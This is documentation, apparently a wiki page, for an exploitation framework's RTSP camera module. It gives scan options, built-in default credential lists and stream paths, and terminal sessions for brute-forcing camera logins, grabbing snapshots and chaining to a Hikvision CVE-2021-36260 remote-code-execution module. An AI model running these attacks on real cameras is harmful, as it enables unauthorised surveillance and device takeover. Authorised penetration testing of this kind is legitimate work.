# RTSP Camera Engine

**Language:** English (en-US) | **pt-BR:** [../pt-BR/21-rtsp-camera-engine.md](../pt-BR/21-rtsp-camera-engine.md)

---

## Overview

EmbedXPL-Forge includes a complete RTSP camera discovery and exploitation engine. It covers:

- **RTSP service discovery** across a network range
- **Vendor / model fingerprinting** from server headers and SDP
- **Default credential testing** (20+ credential pairs built-in)
- **Unauthenticated stream enumeration** (20 default paths)
- **Snapshot capture** from accessible streams
- **Integration with camera exploit modules** (Hikvision, Dahua, Herospeed, etc.)

### RTSP module map

| Module | Path | Role |
|--------|------|------|
| `rtsp_scanner` | `scanners/cameras/rtsp_scanner` | Full RTSP scan + fingerprint + credential test |
| `rtsp_discover` | `scanners/cameras/rtsp_discover` | Quick RTSP service discovery (no credential test) |
| `camera_scan` | `scanners/cameras/camera_scan` | Generic multi-protocol camera discovery |
| `rtsp_cameradar_attack` | `exploits/cameras/multi/rtsp_cameradar_attack` | Full RTSP Cameradar-style attack chain |

---

## `embedxpl-rtsp-discover` — RTSP Discovery

### Entry point

The RTSP scanner is used directly inside the interactive shell:

```text
exf > use scanners/cameras/rtsp_scanner
```

Or via non-interactive module invocation:

```bash
exf -m scanners/cameras/rtsp_scanner -s "target 192.168.1.0/24"
```

### Options — `rtsp_scanner`

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 / CIDR | Target IP or network range |
| `port` | `OptPort` | No | `554` | 1-65535 | Primary RTSP port (also probes 8554 automatically) |
| `timeout` | `OptPort` | No | `5` | seconds | Per-host connection timeout |
| `threads` | `OptInteger` | No | `8` | 1-300 | Concurrent scan threads |
| `test_creds` | `OptBool` | No | `True` | `true/false` | Test default credentials after discovery |
| `paths` | `OptString` | No | `(built-in)` | comma-separated list | Override default RTSP paths to test |
| `snapshot` | `OptBool` | No | `False` | `true/false` | Capture snapshot from accessible stream (requires ffmpeg) |
| `output` | `OptString` | No | `""` | file path | Save results to file |

**Built-in RTSP paths tested:**

```
/                          /live                     /live.sdp
/live0.sdp                 /live1.sdp                /h264
/h264/ch1/main/av_stream   /cam/realmonitor?...      /onvif1
/axis-media/media.amp      /MediaInput/h264          /PSIA/streaming/channels/1
/stream1                   /stream2                  /ch0_0.h264
/ch01.264                  /video1                   /video.h264
/profile1/media.smp        /mpeg4/media.amp
```

**Built-in credential pairs tested (20 entries):**

```
admin:(empty)    admin:admin      admin:12345      admin:1234
admin:password   admin:Admin      admin:123456     admin:abc123
admin:888888     user:user        root:root        root:12345
admin:666666     admin:1111       service:service  guest:(empty)
admin:Hik12345   admin:admin1234  admin:pass       (empty):(empty)
```

---

### Terminal session — RTSP discovery on a /24

```text
exf > use scanners/cameras/rtsp_scanner
exf (RTSP Camera Scanner) > set target 192.168.1.0/24
[+] target => 192.168.1.0/24
exf (RTSP Camera Scanner) > set timeout 5
[+] timeout => 5
exf (RTSP Camera Scanner) > set threads 16
[+] threads => 16
exf (RTSP Camera Scanner) > show options

Target options:
┌────────────┬──────────────────┬──────────────────────────────────────────────────────────────┐
│ Name       │ Current settings │ Description                                                  │
├────────────┼──────────────────┼──────────────────────────────────────────────────────────────┤
│ target     │ 192.168.1.0/24   │ Target IP or network range                                   │
│ port       │ 554              │ Primary RTSP port                                            │
│ timeout    │ 5                │ Per-host connection timeout                                  │
│ threads    │ 16               │ Concurrent scan threads                                      │
│ test_creds │ True             │ Test default credentials after discovery                     │
│ snapshot   │ False            │ Capture snapshot from accessible streams (requires ffmpeg)   │
│ output     │                  │ Save results to file                                         │
└────────────┴──────────────────┴──────────────────────────────────────────────────────────────┘

exf (RTSP Camera Scanner) > run
[*] Running module ...
[*] Scanning 254 hosts on RTSP ports 554, 8554...
[*] 16 threads active

[+] 192.168.1.60 — RTSP service detected (port 554)
[*]   Server: Hikvision DS-2CD2143G2-I firmware V5.7.16
[*]   Probing 20 stream paths...
[+]   Path /Streaming/Channels/101 — RTSP/1.0 200 OK (authenticated)
[+]   Path /h264/ch1/main/av_stream — RTSP/1.0 200 OK (unauthenticated!)
[+]   UNAUTHENTICATED STREAM: rtsp://192.168.1.60:554/h264/ch1/main/av_stream
[*]   Testing 20 credential pairs...
[+]   Credentials found: admin:(empty)
[+]   Authenticated stream: rtsp://admin:@192.168.1.60:554/Streaming/Channels/101

[+] 192.168.1.61 — RTSP service detected (port 554)
[*]   Server: Dahua IPC-HDW2831T-AS, firmware 2.840.0005.0.R
[*]   Probing 20 stream paths...
[+]   Path /cam/realmonitor?channel=1&subtype=0 — RTSP/1.0 200 OK
[*]   Testing credentials...
[+]   Credentials found: admin:admin
[+]   Authenticated stream: rtsp://admin:admin@192.168.1.61:554/cam/realmonitor?channel=1&subtype=0

[+] 192.168.1.62 — RTSP service detected (port 8554)
[*]   Server: Generic H.265 NVR (OEM Herospeed)
[*]   Probing paths...
[-]   No unauthenticated paths
[*]   Testing credentials...
[+]   Credentials found: admin:1234
[+]   Authenticated stream: rtsp://admin:1234@192.168.1.62:8554/live

[-] 192.168.1.100 — Port 554 open but no RTSP response (may be HTTP camera or non-RTSP service)

[*] Scan complete — 254 hosts probed
[+] Results summary:
    Hosts with RTSP:              3
    Unauthenticated streams:      1
    Authenticated (default cred): 3

┌─────────────────┬──────┬────────────────────────────────────────────────────────────────────────────────────────┬──────────────┐
│ Host            │ Port │ Stream URL                                                                              │ Credentials  │
├─────────────────┼──────┼────────────────────────────────────────────────────────────────────────────────────────┼──────────────┤
│ 192.168.1.60    │ 554  │ rtsp://192.168.1.60:554/h264/ch1/main/av_stream (UNAUTHENTICATED)                     │ (none)       │
│ 192.168.1.60    │ 554  │ rtsp://admin:@192.168.1.60:554/Streaming/Channels/101                                  │ admin:       │
│ 192.168.1.61    │ 554  │ rtsp://admin:admin@192.168.1.61:554/cam/realmonitor?channel=1&subtype=0               │ admin:admin  │
│ 192.168.1.62    │ 8554 │ rtsp://admin:1234@192.168.1.62:8554/live                                              │ admin:1234   │
└─────────────────┴──────┴────────────────────────────────────────────────────────────────────────────────────────┴──────────────┘
```

---

### Terminal session — RTSP discovery single host with snapshot

```text
exf (RTSP Camera Scanner) > set target 192.168.1.60
[+] target => 192.168.1.60
exf (RTSP Camera Scanner) > set snapshot true
[+] snapshot => True
exf (RTSP Camera Scanner) > run
[*] Running module ...
[*] Probing 192.168.1.60 on ports 554, 8554...
[+] RTSP service at 192.168.1.60:554
[+] Unauthenticated stream: rtsp://192.168.1.60:554/h264/ch1/main/av_stream
[*] Capturing snapshot with ffmpeg...
    ffmpeg -rtsp_transport tcp -i rtsp://192.168.1.60:554/h264/ch1/main/av_stream -vframes 1 ./snapshots/192.168.1.60_ch1_2026-06-01T20-30-00.jpg
[+] Snapshot saved: ./snapshots/192.168.1.60_ch1_2026-06-01T20-30-00.jpg (187433 bytes)
```

---

### Terminal session — RTSP quick discovery (no credential test)

```text
exf > use scanners/cameras/rtsp_discover
exf (RTSP Discover) > set target 10.0.0.0/24
[+] target => 10.0.0.0/24
exf (RTSP Discover) > run
[*] Running module ...
[*] Quick RTSP scan on 10.0.0.0/24 (ports 554, 8554, no credential testing)...
[+] 10.0.0.10 — port 554 responding to RTSP OPTIONS
[+] 10.0.0.11 — port 8554 responding to RTSP OPTIONS
[+] 10.0.0.45 — port 554 responding to RTSP OPTIONS
[*] 3 RTSP services found. Use rtsp_scanner for credential testing.
```

---

## Credential testing detail

When `test_creds=True`, the engine tests each discovered RTSP service with the built-in credential list using **RTSP DESCRIBE** requests with **Authorization: Basic** headers. It reports the first successful credential pair.

**Terminal session — credential test only (single host):**

```text
exf (RTSP Camera Scanner) > set target 192.168.1.61
[+] target => 192.168.1.61
exf (RTSP Camera Scanner) > set test_creds true
[+] test_creds => True
exf (RTSP Camera Scanner) > run
[*] Running module ...
[*] Probing 192.168.1.61:554...
[+] RTSP service detected (Dahua IPC-HDW2831T-AS)
[*] Testing 20 credential pairs on /cam/realmonitor?channel=1&subtype=0...
[-] admin:(empty) — 401 Unauthorized
[+] admin:admin — 200 OK — CREDENTIALS FOUND
[+] Full stream: rtsp://admin:admin@192.168.1.61:554/cam/realmonitor?channel=1&subtype=0
[*] Testing additional paths with valid credentials...
[+] Sub-stream: rtsp://admin:admin@192.168.1.61:554/cam/realmonitor?channel=1&subtype=1
[+] High-res:   rtsp://admin:admin@192.168.1.61:554/cam/realmonitor?channel=2&subtype=0
```

---

## Snapshot capture

Snapshot capture requires **ffmpeg** to be installed and available in PATH.

```bash
# Install ffmpeg
sudo apt-get install ffmpeg    # Debian/Ubuntu
brew install ffmpeg            # macOS
```

Snapshots are saved to `./snapshots/` in the current working directory. Filename format: `<host>_<path_slug>_<timestamp>.jpg`.

**Error case — ffmpeg not installed:**

```text
[!] ffmpeg not found in PATH — snapshot capture unavailable
[*] Install: sudo apt-get install ffmpeg
[*] Stream URL for manual capture: rtsp://admin:@192.168.1.60:554/h264/ch1/main/av_stream
```

**Manual snapshot (outside exf):**

```bash
ffmpeg -rtsp_transport tcp \
       -i "rtsp://admin:@192.168.1.60:554/h264/ch1/main/av_stream" \
       -vframes 1 snapshot.jpg -y
```

---

## Integration with camera exploit modules

After discovering RTSP services, chain directly to camera exploit modules:

```text
# Step 1: Discover cameras
exf > use scanners/cameras/rtsp_scanner
exf (RTSP Camera Scanner) > set target 192.168.1.0/24
exf (RTSP Camera Scanner) > run
[+] 192.168.1.60 — Hikvision DS-2CD2143G2-I, stream accessible

# Step 2: Check for CVE-2021-36260 RCE
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE CVE-2021-36260) > set target 192.168.1.60
[+] target => 192.168.1.60
exf (Hikvision Unauthenticated RCE CVE-2021-36260) > check
[+] Target is vulnerable
exf (Hikvision Unauthenticated RCE CVE-2021-36260) > run
[*] Running module ...
[+] CVE-2021-36260: Payload delivered to 192.168.1.60:80
[!] Verify execution via OOB callback
```

### AutoPwn integration

```text
exf > use scanners/autopwn
exf (AutoPwn) > set target 192.168.1.60
[+] target => 192.168.1.60
exf (AutoPwn) > set vendor hikvision
[+] vendor => hikvision
exf (AutoPwn) > set timing_template T4
[+] timing_template => T4
exf (AutoPwn) > run
[*] AutoPwn timing template T4 (aggressive) active: threads=16...
[+] 192.168.1.60:80 http exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 is vulnerable
[+] 192.168.1.60:80 http exploits/cameras/hikvision/info_disclosure_cve_2017_7921 is vulnerable
```

---

## RTSP Cameradar attack chain

`exploits/cameras/multi/rtsp_cameradar_attack` implements the full Cameradar-style attack: port scan + RTSP probe + route brute-force + credential brute-force.

**Options:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 / CIDR | Target host or network |
| `ports` | `OptString` | No | `554,8554` | comma-separated ports | RTSP ports to probe |
| `timeout` | `OptPort` | No | `5` | seconds | Per-probe timeout |
| `threads` | `OptInteger` | No | `8` | 1-300 | Concurrent threads |
| `routes_file` | `OptString` | No | `(built-in)` | file path | Custom RTSP routes wordlist |
| `creds_file` | `OptString` | No | `(built-in)` | file path | Custom credentials wordlist |

**Terminal session — Cameradar attack:**

```text
exf > use exploits/cameras/multi/rtsp_cameradar_attack
exf (RTSP Cameradar Attack) > set target 10.0.0.0/24
[+] target => 10.0.0.0/24
exf (RTSP Cameradar Attack) > set threads 24
[+] threads => 24
exf (RTSP Cameradar Attack) > run
[*] Running module ...
[*] Phase 1: Port scan for RTSP services on 10.0.0.0/24 (ports 554, 8554)...
[+] 10.0.0.20 — port 554 open
[+] 10.0.0.21 — port 554 open
[+] 10.0.0.45 — port 8554 open
[*] Phase 2: RTSP route brute-force on discovered hosts...
[+] 10.0.0.20 — route found: /h264/ch1/main/av_stream (200 OK)
[+] 10.0.0.21 — route found: /cam/realmonitor?channel=1&subtype=0 (200 OK, 401 on auth)
[+] 10.0.0.45 — route found: /live (200 OK, no auth!)
[*] Phase 3: Credential brute-force for authenticated routes...
[+] 10.0.0.20 — credentials: admin:(empty)
[+] 10.0.0.21 — credentials: admin:admin
[-] 10.0.0.45 — no credentials needed (unauthenticated stream)

[+] Final results:
    rtsp://admin:@10.0.0.20:554/h264/ch1/main/av_stream
    rtsp://admin:admin@10.0.0.21:554/cam/realmonitor?channel=1&subtype=0
    rtsp://10.0.0.45:8554/live (UNAUTHENTICATED)
```

---

## Vendor-specific RTSP path reference

| Vendor | Common RTSP path | Notes |
|--------|-----------------|-------|
| Hikvision | `/Streaming/Channels/101` | Main stream; subtype 1 for sub-stream |
| Hikvision | `/h264/ch1/main/av_stream` | Alt path (older firmware) |
| Dahua | `/cam/realmonitor?channel=1&subtype=0` | Channel/subtype selectable |
| Axis | `/axis-media/media.amp` | May require credentials |
| Reolink | `/h264Preview_01_main` | Main stream |
| Herospeed/Longsee | `/live/ch00_0` | Channel 0, sub-stream 0 |
| Swann | `/live/0/MAIN` | Main stream |
| Foscam | `/videoMain` | H.264 main |
| MotionEye | `/stream/video` | MJPEG (not H.264) |
| RTSP generic | `/` or `/live.sdp` | Check SDP for actual media paths |

---

## Error cases

```text
[-] 192.168.1.100:554 — Connection refused (no RTSP service or port filtered)
```

```text
[-] 192.168.1.101:554 — RTSP OPTIONS returned 405 Method Not Allowed (non-camera HTTP service)
```

```text
[-] No accessible RTSP streams found on 192.168.1.60 — all paths returned 401 and no credentials matched
[*] Try running: use exploits/cameras/hikvision/info_disclosure_cve_2017_7921
```

```text
[!] ffmpeg not found — skipping snapshot capture for 192.168.1.60
```

[Wiki hub](../README.md)
